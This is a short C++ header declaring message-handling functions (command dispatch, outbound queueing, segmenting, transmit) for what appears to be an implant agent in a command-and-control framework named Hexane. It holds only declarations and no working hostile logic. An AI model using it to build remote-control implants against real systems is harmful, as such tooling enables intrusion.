#ifndef HEXANE_MESSAGE_HPP
#define HEXANE_MESSAGE_HPP
#include <core/include/monolith.hpp>
#include <core/include/commands.hpp>
#include <core/include/network.hpp>
#include <core/include/stream.hpp>
#include <core/include/parser.hpp>

namespace Message {
    FUNCTION BOOL PeekPID(PSTREAM Stream);
    FUNCTION VOID CommandDispatch (PSTREAM Inbound);
    FUNCTION VOID AddMessage(PSTREAM Outbound);
    FUNCTION VOID ClearQueue(VOID);
    FUNCTION VOID QueueSegments(PBYTE Buffer, ULONG Length);
    FUNCTION VOID OutboundQueue(PSTREAM Outbound);
    FUNCTION VOID MessageTransmit(VOID);
}
#endif //HEXANE_MESSAGE_HPP

